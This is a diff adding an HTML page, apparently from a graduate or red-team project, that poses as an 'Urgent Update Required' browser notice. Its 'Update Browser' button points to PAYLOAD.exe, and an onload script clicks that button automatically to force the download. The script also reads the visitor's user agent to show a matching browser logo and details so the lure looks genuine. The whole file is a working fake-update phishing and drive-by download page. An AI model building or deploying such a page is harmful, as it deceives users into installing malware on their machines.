@@ -1,0 +1,111 @@
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="Matt_Grad_Proj_Page_files/stats.sdx"></script>
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="https://getbootstrap.com/favicon.ico">
+
+    <title>Urgent Update Required</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="Matt_Grad_Proj_Page_files/bootstrap.css" rel="stylesheet">
+
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <link href="Matt_Grad_Proj_Page_files/ie10-viewport-bug-workaround.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="Matt_Grad_Proj_Page_files/jumbotron-narrow.css" rel="stylesheet">
+
+    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+    <script src="Matt_Grad_Proj_Page_files/ie-emulation-modes-warning.sdx"></script>
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  <link rel="stylesheet" type="text/css" href="chrome-extension://pkehgijcmpdhfbdbbnkijodmdjhbjlgp/skin/socialwidgets.css"></head>
+
+  <body>
+
+    <div class="container">
+      <div class="header clearfix">
+        
+        
+      </div>
+
+      <div class="jumbotron">
+      
+        <img id="browser_logo" src="D.png" alt="DOH!" width="100" height="100">
+        
+        <h1>Update Required!</h1>
+        
+        <p class="lead">We have detected that your browser is out of date. Please click below to download and install an update.</p>
+        
+        <p id="browser_info"> </p>
+        
+        <p><a id="download_button" class="btn btn-lg btn-success" href="PAYLOAD.exe" role="button">Update Browser</a></p>
+      </div>
+
+      
+
+      <!-- <footer class="footer"> -->
+        <!-- <p>© 2016</p> -->
+      <!-- </footer> -->
+
+    </div> <!-- /container -->
+
+
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="Matt_Grad_Proj_Page_files/ie10-viewport-bug-workaround.sdx"></script>
+    
+<script>
+function getAgentInfo() {
+    document.getElementById('download_button').click()
+    
+    var sBrowser, sUsrAg = navigator.userAgent;
+    if(sUsrAg.indexOf("Chrome") > -1) {
+        sBrowser = "Google Chrome";
+        document.getElementById('browser_logo').src='GC.png'
+    } else if (sUsrAg.indexOf("Safari") > -1) {
+        sBrowser = "Apple Safari";
+        document.getElementById('browser_logo').src='AS.png'
+    } else if (sUsrAg.indexOf("Opera") > -1) {
+        sBrowser = "Opera";
+        document.getElementById('browser_logo').src='O.png'
+    } else if (sUsrAg.indexOf("Firefox") > -1) {
+        sBrowser = "Mozilla Firefox";
+        document.getElementById('browser_logo').src='FF.png'
+    } else if (sUsrAg.indexOf("MSIE") > -1) {
+        sBrowser = "Microsoft Internet Explorer";
+        document.getElementById('browser_logo').src='MI.png'
+    } else if (sUsrAg.indexOf("Edge") > -1) {
+        sBrowser = "Microsoft Edge";
+        document.getElementById('browser_logo').src='ME.png'
+    } else {
+        sBrowser = "Unknown Browser";
+        document.getElementById('browser_logo').src='D.png'
+    }
+    
+    
+    
+    var txt = "";
+    txt += "<p>Browser Name: " + sBrowser + "</p>";
+    txt += "<p>Browser Language: " + navigator.language + "</p>";
+    txt += "<p>Operating System: " + navigator.platform + "</p>";
+    txt += "<p>User-agent header: " + navigator.userAgent + "</p>";
+    document.getElementById("browser_info").innerHTML = txt;
+    }
+    
+    
+    
+    </script>
+
+    
+<body onload="getAgentInfo()">
+
+</body></html>
+<!-- Code licensed MIT, docs CC BY 3.0. github.com/twbs/bootstrap/blob/master/LICENSE-->
